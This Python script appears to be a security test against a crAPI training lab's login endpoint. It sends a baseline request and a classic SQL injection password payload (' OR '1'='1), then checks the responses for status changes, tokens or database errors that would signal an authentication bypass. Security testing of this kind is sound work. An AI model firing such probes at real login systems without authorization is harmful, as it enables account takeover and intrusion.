import json
import re
import time
from pathlib import Path
import httpx

ENDPOINT = "http://crapi.apisec.ai/identity/api/auth/login"


def submit(client, payload):
    started = time.perf_counter()
    try:
        response = client.post(ENDPOINT, json=payload)
        body = response.text
        token_like = bool(re.search(r"(?i)(?:access_token|token|jwt)\s*[:=]", body))
        return {
            "status": response.status_code,
            "elapsed": round(time.perf_counter() - started, 4),
            "size": len(response.content),
            "content_type": response.headers.get("content-type", ""),
            "token_like_response": token_like,
            "body_preview": body[:300],
            "error": None,
        }
    except httpx.HTTPError as exc:
        return {"status": 0, "elapsed": round(time.perf_counter() - started, 4), "size": 0, "content_type": "", "token_like_response": False, "body_preview": "", "error": str(exc)}


def main():
    baseline_payload = {"email": "nobody-test@example.com", "password": "definitely-not-a-real-password"}
    sqli_payload = {"email": "nobody-test@example.com", "password": "x' OR '1'='1"}
    with httpx.Client(timeout=30, follow_redirects=True, headers={"User-Agent": "APISecurityPlatform-AuthorizedTrainingCheck/1.0"}) as client:
        baseline = submit(client, baseline_payload)
        probe = submit(client, sqli_payload)
    result = {
        "endpoint": ENDPOINT,
        "baseline": baseline,
        "probe": probe,
        "status_changed": baseline["status"] != probe["status"],
        "size_delta": probe["size"] - baseline["size"],
        "response_time_delta": round(probe["elapsed"] - baseline["elapsed"], 4),
        "token_like_response_changed": (not baseline["token_like_response"]) and probe["token_like_response"],
        "error_signature_in_probe": any(token in probe["body_preview"].lower() for token in ("sql", "syntax", "database", "exception", "stack trace")),
    }
    Path("tests/crapi_login_manual_sql_results.json").write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
